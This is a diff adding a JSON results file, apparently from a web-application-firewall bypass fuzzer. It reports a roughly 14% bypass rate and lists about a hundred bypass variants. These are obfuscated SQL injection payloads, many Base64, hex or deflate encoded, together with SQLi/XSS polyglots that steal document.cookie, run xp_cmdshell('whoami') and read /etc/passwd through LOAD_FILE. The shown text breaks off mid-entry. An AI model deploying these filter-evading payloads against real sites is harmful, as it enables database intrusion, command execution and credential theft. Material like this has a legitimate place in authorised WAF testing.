@@ -1,0 +1,3543 @@
+{
+  "aborted_rate_limited": false,
+  "baseline_transport_ok": true,
+  "blocked": 2288,
+  "bypass_rate_pct": 13.991920675725304,
+  "bypass_variants": [
+    {
+      "confidence": 0.97,
+      "payload": "1\n\tUnIoN/**//**//*!SELECT*/\tNULL--\f-",
+      "techniques": [
+        "equiv-moat::learn::multipart_file",
+        "equiv-rules::ws_equiv+keyword_morph"
+      ],
+      "variant": 1
+    },
+    {
+      "confidence": 0.97,
+      "payload": "1\fUnIoN /**/ /*!50000SELECT*//*!*/NULL--/*x*/-",
+      "techniques": [
+        "equiv-moat::learn::multipart_file",
+        "equiv-rules::ws_equiv+keyword_morph"
+      ],
+      "variant": 2
+    },
+    {
+      "confidence": 0.97,
+      "payload": "1\nUNION/**/SELECT/**/NULL--/*!*/-",
+      "techniques": [
+        "equiv-moat::learn::multipart_file",
+        "equiv-rules::ws_equiv"
+      ],
+      "variant": 3
+    },
+    {
+      "confidence": 0.97,
+      "payload": "1/*!*/UnIoN/**//**//*!50000SELECT*//**//**/NULL--\u000b-",
+      "techniques": [
+        "equiv-moat::learn::path_segment",
+        "equiv-rules::ws_equiv+keyword_morph"
+      ],
+      "variant": 4
+    },
+    {
+      "confidence": 0.97,
+      "payload": "0x1 UNION/**//*!SELECT*/  NULL--\u000b-",
+      "techniques": [
+        "equiv-moat::learn::path_segment",
+        "equiv-rules::ws_equiv+keyword_morph+literal_encode"
+      ],
+      "variant": 5
+    },
+    {
+      "confidence": 0.97,
+      "payload": "1 UNION SELECT NULL-- -",
+      "techniques": [
+        "equiv-moat::learn::multipart_file",
+        "equiv-rules::identity"
+      ],
+      "variant": 6
+    },
+    {
+      "confidence": 0.97,
+      "payload": "1  UNION/*!50000*/SELECT\n\tNULL--/*!*/-",
+      "techniques": [
+        "equiv-moat::learn::path_segment",
+        "equiv-rules::ws_equiv"
+      ],
+      "variant": 7
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBPUiAxIElTIE5PVCBOVUxM",
+      "techniques": [
+        "quote_free_strip_comment",
+        "encoding::Base64Encode"
+      ],
+      "variant": 106
+    },
+    {
+      "confidence": 0.91,
+      "payload": "31204f522031204953204e4f54204e554c4c",
+      "techniques": [
+        "quote_free_strip_comment",
+        "encoding::HexEncode"
+      ],
+      "variant": 118
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiBTRUxFQ1QgTlVMTC0t",
+      "techniques": [
+        "comment_swap",
+        "encoding::Base64Encode"
+      ],
+      "variant": 134
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e2053454c454354204e554c4c2d2d",
+      "techniques": [
+        "comment_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 150
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiBTRUxFQ1QgTlVMTC0tIA",
+      "techniques": [
+        "comment_swap",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 178
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e2053454c454354204e554c4c2d2d20",
+      "techniques": [
+        "comment_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 182
+    },
+    {
+      "confidence": 0.91,
+      "payload": "M1QI9fP091MIdvVxdQ5R8Av18dHVVQAA",
+      "techniques": [
+        "comment_swap",
+        "encoding::DeflateEncode"
+      ],
+      "variant": 186
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiBTRUxFQ1QgTlVMTC0tKw",
+      "techniques": [
+        "comment_swap",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 209
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e2053454c454354204e554c4c2d2d2b",
+      "techniques": [
+        "comment_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 210
+    },
+    {
+      "confidence": 0.91,
+      "payload": "M1QI9fP091MIdvVxdQ5R8Av18dHV1QYA",
+      "techniques": [
+        "comment_swap",
+        "encoding::DeflateEncode"
+      ],
+      "variant": 214
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiBTRUxFQ1QgTlVMTCM",
+      "techniques": [
+        "comment_swap",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 238
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e2053454c454354204e554c4c23",
+      "techniques": [
+        "comment_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 242
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiBTRUxFQ1QgTlVMTC8q",
+      "techniques": [
+        "comment_swap",
+        "encoding::Base64Encode"
+      ],
+      "variant": 258
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e2053454c454354204e554c4c2f2a",
+      "techniques": [
+        "comment_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 274
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiBTRUxFQ1QgTlVMTDstLQ",
+      "techniques": [
+        "comment_swap",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 302
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e2053454c454354204e554c4c3b2d2d",
+      "techniques": [
+        "comment_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 306
+    },
+    {
+      "confidence": 0.91,
+      "payload": "M1QI9fP091MIdvVxdQ5R8Av18bHW1QUA",
+      "techniques": [
+        "comment_swap",
+        "encoding::DeflateEncode"
+      ],
+      "variant": 310
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiBTRUxFQ1QgTlVMTDsj",
+      "techniques": [
+        "comment_swap",
+        "encoding::Base64Encode"
+      ],
+      "variant": 322
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e2053454c454354204e554c4c3b23",
+      "techniques": [
+        "comment_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 334
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MQlVTklPTglTRUxFQ1QJTlVMTC0tCS0",
+      "techniques": [
+        "whitespace_swap",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 358
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3109554e494f4e0953454c454354094e554c4c2d2d092d",
+      "techniques": [
+        "whitespace_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 362
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MQpVTklPTgpTRUxFQ1QKTlVMTC0tCi0",
+      "techniques": [
+        "whitespace_swap",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 385
+    },
+    {
+      "confidence": 0.91,
+      "payload": "310a554e494f4e0a53454c4543540a4e554c4c2d2d0a2d",
+      "techniques": [
+        "whitespace_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 386
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSsoK1VOSU9OKygrU0VMRUNUKygrTlVMTC0tKygrLQ",
+      "techniques": [
+        "whitespace_swap",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 410
+    },
+    {
+      "confidence": 0.91,
+      "payload": "312b282b554e494f4e2b282b53454c4543542b282b4e554c4c2d2d2b282b2d",
+      "techniques": [
+        "whitespace_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 414
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiBBTEwgU0VMRUNUIE5VTEwtLSAt",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64Encode"
+      ],
+      "variant": 426
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e20414c4c2053454c454354204e554c4c2d2d202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 442
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiBESVNUSU5DVCBTRUxFQ1QgTlVMTC0tIC0",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 470
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e2044495354494e43542053454c454354204e554c4c2d2d202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 474
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiUwQVNFTEVDVCBOVUxMLS0gLQ",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 502
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e25304153454c454354204e554c4c2d2d202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 506
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e25303953454c454354204e554c4c2d2d202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 533
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiUwOVNFTEVDVCBOVUxMLS0gLQ",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 534
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e25304425304153454c454354204e554c4c2d2d202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 565
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiUwRCUwQVNFTEVDVCBOVUxMLS0gLQ",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 566
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiUwQlNFTEVDVCBOVUxMLS0gLQ",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 594
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e25304253454c454354204e554c4c2d2d202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 598
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiUwQ1NFTEVDVCBOVUxMLS0gLQ",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 626
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e25304353454c454354204e554c4c2d2d202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 630
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e25413053454c454354204e554c4c2d2d202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 657
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiVBMFNFTEVDVCBOVUxMLS0gLQ",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 658
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTi8qKi9TRUxFQ1QgTlVMTC0tIC0",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 689
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e2f2a2a2f53454c454354204e554c4c2d2d202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 690
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTi8qZm9vKi9TRUxFQ1QgTlVMTC0tIC0",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 721
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e2f2a666f6f2a2f53454c454354204e554c4c2d2d202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 722
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTi8qJTAwKi9TRUxFQ1QgTlVMTC0tIC0",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 753
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e2f2a2530302a2f53454c454354204e554c4c2d2d202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 754
+    },
+    {
+      "confidence": 0.91,
+      "payload": "31202f2a21554e494f4e2a2f2053454c454354204e554c4c2d2d202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 785
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSAvKiFVTklPTiovIFNFTEVDVCBOVUxMLS0gLQ",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 786
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSAvKiFVTklPTiovLyohU0VMRUNUKi8gTlVMTC0tIC0",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 817
+    },
+    {
+      "confidence": 0.91,
+      "payload": "31202f2a21554e494f4e2a2f2f2a2153454c4543542a2f204e554c4c2d2d202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 818
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTi8qISBTRUxFQ1QqLyBOVUxMLS0gLQ",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 849
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e2f2a212053454c4543542a2f204e554c4c2d2d202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 850
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSAvKiE1MDAwMFVOSU9OKi8vKiE1MDAwMFNFTEVDVCovIE5VTEwtLSAt",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64Encode"
+      ],
+      "variant": 866
+    },
+    {
+      "confidence": 0.91,
+      "payload": "31202f2a213530303030554e494f4e2a2f2f2a21353030303053454c4543542a2f204e554c4c2d2d202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 882
+    },
+    {
+      "confidence": 0.91,
+      "payload": "31202f2a213430303030554e494f4e2a2f2f2a213430303030414c4c2a2f2f2a21343030303053454c4543542a2f204e554c4c2d2d202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 913
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSAvKiE0MDAwMFVOSU9OKi8vKiE0MDAwMEFMTCovLyohNDAwMDBTRUxFQ1QqLyBOVUxMLS0gLQ",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 914
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSAvKiE5OTk5OVVOSU9OKi9TRUxFQ1QgTlVMTC0tIC0",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 945
+    },
+    {
+      "confidence": 0.91,
+      "payload": "31202f2a213939393939554e494f4e2a2f53454c454354204e554c4c2d2d202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 946
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVbklvTi8qKi9TZUxlQ3QgTlVMTC0tIC0",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 974
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120556e496f4e2f2a2a2f53654c654374204e554c4c2d2d202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 978
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSB1TmlPbi8qKi9zRWxFY1QgTlVMTC0tIC0",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 1006
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120754e694f6e2f2a2a2f73456c456354204e554c4c2d2d202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 1010
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVbklvTiUwQXNFbEVjVCBOVUxMLS0gLQ",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 1037
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120556e496f4e25304173456c456354204e554c4c2d2d202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 1038
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTlVOSU9OSU9OIFNFU0VMRUNUTEVDVCBOVUxMLS0gLQ",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 1066
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e554e494f4e494f4e20534553454c4543544c454354204e554c4c2d2d202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 1070
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTkl1bmlvbk9OIFNFTHNlbGVjdEVDVCBOVUxMLS0gLQ",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 1098
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e49756e696f6e4f4e2053454c73656c656374454354204e554c4c2d2d202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 1102
+    },
+    {
+      "confidence": 0.91,
+      "payload": "ASIA3f8xIFVOSXVuaW9uT04gU0VMc2VsZWN0RUNUIE5VTEwtLSAt",
+      "techniques": [
+        "union_swap",
+        "encoding::DeflateEncode"
+      ],
+      "variant": 1106
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTlwKU0VMRUNUIE5VTEwtLSAt",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64Encode"
+      ],
+      "variant": 1118
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e5c0a53454c454354204e554c4c2d2d202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 1130
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiAvKiE1MDAwMCBTRUxFQ1QgTlVMTC0tIC0qLw",
+      "techniques": [
+        "mysql",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 1161
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e202f2a2135303030302053454c454354204e554c4c2d2d202d2a2f",
+      "techniques": [
+        "mysql",
+        "encoding::HexEncode"
+      ],
+      "variant": 1162
+    },
+    {
+      "confidence": 0.91,
+      "payload": "ASIA3f8xIFVOSU9OIC8qITUwMDAwIFNFTEVDVCBOVUxMLS0gLSov",
+      "techniques": [
+        "mysql",
+        "encoding::DeflateEncode"
+      ],
+      "variant": 1166
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiBTRUxFQ1QgTlVMTC0tIC0",
+      "techniques": [
+        "mysql",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 1190
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e2053454c454354204e554c4c2d2d202d",
+      "techniques": [
+        "mysql",
+        "encoding::HexEncode"
+      ],
+      "variant": 1194
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiAvKiEwMDAwMCBTRUxFQ1QgTlVMTC0tIC0qLw",
+      "techniques": [
+        "mysql",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 1222
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e202f2a2130303030302053454c454354204e554c4c2d2d202d2a2f",
+      "techniques": [
+        "mysql",
+        "encoding::HexEncode"
+      ],
+      "variant": 1226
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiAvKiFTRUxFQ1QgTlVMTC0tIC0qLw",
+      "techniques": [
+        "mysql",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 1257
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e202f2a2153454c454354204e554c4c2d2d202d2a2f",
+      "techniques": [
+        "mysql",
+        "encoding::HexEncode"
+      ],
+      "variant": 1258
+    },
+    {
+      "confidence": 0.91,
+      "payload": "M1QI9fP091PQ11IMdvVxdQ5R8Av18dHVVdDV0gcA",
+      "techniques": [
+        "mysql",
+        "encoding::DeflateEncode"
+      ],
+      "variant": 1262
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiBTRUxFQ1QgTlVMTC0tIC0gVU5JT04gU0VMRUNUIHRhYmxlX25hbWUsTlVMTCBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMtLQ",
+      "techniques": [
+        "mysql",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 1290
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e2053454c454354204e554c4c2d2d202d20554e494f4e2053454c454354207461626c655f6e616d652c4e554c4c2046524f4d20696e666f726d6174696f6e5f736368656d612e7461626c65732d2d",
+      "techniques": [
+        "mysql",
+        "encoding::HexEncode"
+      ],
+      "variant": 1294
+    },
+    {
+      "confidence": 0.91,
+      "payload": "27204f52202731273d273127202d2d203c7363726970743e616c6572742831293c2f7363726970743e",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::HexEncode"
+      ],
+      "variant": 1321
+    },
+    {
+      "confidence": 0.91,
+      "payload": "JyBPUiAnMSc9JzEnIC0tIDxzY3JpcHQ-YWxlcnQoMSk8L3NjcmlwdD4",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 1322
+    },
+    {
+      "confidence": 0.91,
+      "payload": "JyBVTklPTiBTRUxFQ1QgJzxpbWcgc3JjPXggb25lcnJvcj1hbGVydCgxKT4nLS0g",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::Base64Encode"
+      ],
+      "variant": 1341
+    },
+    {
+      "confidence": 0.91,
+      "payload": "2720554e494f4e2053454c45435420273c696d67207372633d78206f6e6572726f723d616c6572742831293e272d2d20",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::HexEncode"
+      ],
+      "variant": 1358
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MScgQU5EIDE9MSBBTkQgJzxzdmcgb25sb2FkPWFsZXJ0KDEpPic9Jw",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 1386
+    },
+    {
+      "confidence": 0.91,
+      "payload": "312720414e4420313d3120414e4420273c737667206f6e6c6f61643d616c6572742831293e273d27",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::HexEncode"
+      ],
+      "variant": 1390
+    },
+    {
+      "confidence": 0.91,
+      "payload": "Jy1jb25maXJtKDEpLSc",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 1413
+    },
+    {
+      "confidence": 0.91,
+      "payload": "272d636f6e6669726d2831292d27",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::HexEncode"
+      ],
+      "variant": 1414
+    },
+    {
+      "confidence": 0.91,
+      "payload": "JyItLT5dXT4qLzwvc2NyaXB0Pjxzdmcgb25sb2FkPWFsZXJ0KDEpPg",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 1442
+    },
+    {
+      "confidence": 0.91,
+      "payload": "27222d2d3e5d5d3e2a2f3c2f7363726970743e3c737667206f6e6c6f61643d616c6572742831293e",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::HexEncode"
+      ],
+      "variant": 1446
+    },
+    {
+      "confidence": 0.91,
+      "payload": "2720554e494f4e2053454c454354206e756c6c2c636f6e63617428273c7376672f6f6e6c6f61643d616c6572742831293e27292d2d",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::HexEncode"
+      ],
+      "variant": 1477
+    },
+    {
+      "confidence": 0.91,
+      "payload": "JyBVTklPTiBTRUxFQ1QgbnVsbCxjb25jYXQoJzxzdmcvb25sb2FkPWFsZXJ0KDEpPicpLS0",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 1478
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MTtTRUxFQ1QgJzxpbWcgc3JjPXggb25lcnJvcj1hbGVydChkb2N1bWVudC5jb29raWUpPictLQ",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 1510
+    },
+    {
+      "confidence": 0.91,
+      "payload": "313b53454c45435420273c696d67207372633d78206f6e6572726f723d616c65727428646f63756d656e742e636f6f6b6965293e272d2d",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::HexEncode"
+      ],
+      "variant": 1514
+    },
+    {
+      "confidence": 0.91,
+      "payload": "273b20455845432078705f636d647368656c6c282777686f616d6927292d2d",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::HexEncode"
+      ],
+      "variant": 1545
+    },
+    {
+      "confidence": 0.91,
+      "payload": "JzsgRVhFQyB4cF9jbWRzaGVsbCgnd2hvYW1pJyktLQ",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 1546
+    },
+    {
+      "confidence": 0.91,
+      "payload": "2720554e494f4e2053454c454354204c4f41445f46494c4528272f6574632f70617373776427292d2d",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::HexEncode"
+      ],
+      "variant": 1577
+    },
+    {
+      "confidence": 0.91,
+      "payload": "JyBVTklPTiBTRUxFQ1QgTE9BRF9GSUxFKCcvZXRjL3Bhc3N3ZCcpLS0",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 1578
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBpUiAxIeLtIe5PvCbOvUxM",
+      "techniques": [
+        "quote_free_strip_comment",
+        "encoding::Base64Encode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1588
+    },
+    {
+      "confidence": 0.9,
+      "payload": "31204F522031204953204e4F54204e554C4c",
+      "techniques": [
+        "quote_free_strip_comment",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1591
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBvTkLpTiBtRuXfQ1qGtLvMtC0t",
+      "techniques": [
+        "comment_swap",
+        "encoding::Base64Encode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1594
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120554E494f4E2053454c454354204E554c4C2d2D",
+      "techniques": [
+        "comment_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1597
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBvTkLpTiBtRuXfQ1qGtLvMtC0tIa",
+      "techniques": [
+        "comment_swap",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1600
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120554E494f4E2053454c454354204E554c4C2d2D20",
+      "techniques": [
+        "comment_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1603
+    },
+    {
+      "confidence": 0.9,
+      "payload": "M1qI9fP091mIdVvXdQ5r8Av18DhVvQaA",
+      "techniques": [
+        "comment_swap",
+        "encoding::DeflateEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1606
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBvTkLpTiBtRuXfQ1qGtLvMtC0tKw",
+      "techniques": [
+        "comment_swap",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1609
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120554E494f4E2053454c454354204E554c4C2d2D2b",
+      "techniques": [
+        "comment_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1612
+    },
+    {
+      "confidence": 0.9,
+      "payload": "M1qI9fP091mIdVvXdQ5r8Av18DhV1qYa",
+      "techniques": [
+        "comment_swap",
+        "encoding::DeflateEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1615
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBvTkLpTiBtRuXfQ1qGtLvMtCm",
+      "techniques": [
+        "comment_swap",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1618
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120554E494f4E2053454c454354204E554c4C23",
+      "techniques": [
+        "comment_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1621
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBvTkLpTiBtRuXfQ1qGtLvMtC8q",
+      "techniques": [
+        "comment_swap",
+        "encoding::Base64Encode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1624
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120554E494f4E2053454c454354204E554c4C2f2A",
+      "techniques": [
+        "comment_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1627
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBvTkLpTiBtRuXfQ1qGtLvMtDsTlQ",
+      "techniques": [
+        "comment_swap",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1630
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120554E494f4E2053454c454354204E554c4C3b2D2d",
+      "techniques": [
+        "comment_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1633
+    },
+    {
+      "confidence": 0.9,
+      "payload": "M1qI9fP091mIdVvXdQ5r8Av18BhW1qUa",
+      "techniques": [
